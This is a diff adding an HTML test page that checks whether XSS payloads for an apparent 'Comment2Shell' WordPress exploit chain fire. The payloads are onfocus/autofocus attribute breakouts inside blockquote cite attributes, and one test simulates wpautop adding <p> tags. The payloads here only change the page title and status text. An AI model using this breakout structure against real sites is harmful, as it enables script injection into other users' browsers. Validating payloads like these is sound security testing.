@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Comment2Shell XSS Validation</title>
+<style>
+  body { font-family: monospace; margin: 40px; }
+  .test { border: 2px solid #ccc; padding: 20px; margin: 20px 0; }
+  .pass { border-color: green; }
+  .fail { border-color: red; }
+  #status { font-size: 24px; padding: 20px; margin: 20px 0; }
+</style>
+</head>
+<body>
+<h1>Comment2Shell XSS Payload Validation</h1>
+<div id="status">Status: Waiting for XSS trigger...</div>
+
+<div class="test" id="test1">
+<h2>Test 1: Original payload structure</h2>
+<p>This tests if <code>x" onfocus='...' autofocus</code> structure works:</p>
+<blockquote cite="a
+b"><code>x" onfocus='document.getElementById("status").innerHTML="PASS: Test 1 XSS fired!";document.title="C2S_XSS_TEST1";' autofocus tabindex=0>Focused element (test 1)</code></blockquote>
+</div>
+
+<div class="test" id="test2">
+<h2>Test 2: Attribute breakout structure</h2>
+<p>This tests onfocus as proper attribute:</p>
+<blockquote cite="a
+b"><code id="t2" onfocus='document.getElementById("status").innerHTML="PASS: Test 2 XSS fired!";document.title="C2S_XSS_TEST2";' autofocus tabindex=0>Focused element (test 2)</code></blockquote>
+</div>
+
+<div class="test" id="test3">
+<h2>Test 3: After wpautop simulation (p inside attribute)</h2>
+<p>This simulates what wpautop does to the payload:</p>
+<blockquote cite="a 
+<p> b"><code>x" onfocus='document.getElementById("status").innerHTML="PASS: Test 3 XSS fired!";document.title="C2S_XSS_TEST3";' autofocus tabindex=0>Focused element (test 3)</code></p></blockquote>
+</div>
+
+<script>
+// Monitor title changes
+let origTitle = document.title;
+setInterval(() => {
+    if (document.title !== origTitle && document.title.startsWith("C2S_XSS")) {
+        document.getElementById("status").innerHTML = 
+            '<span style="color:green;font-size:32px">XSS TRIGGERED: ' + document.title + '</span>';
+    }
+}, 100);
+</script>
+</body>
+</html>
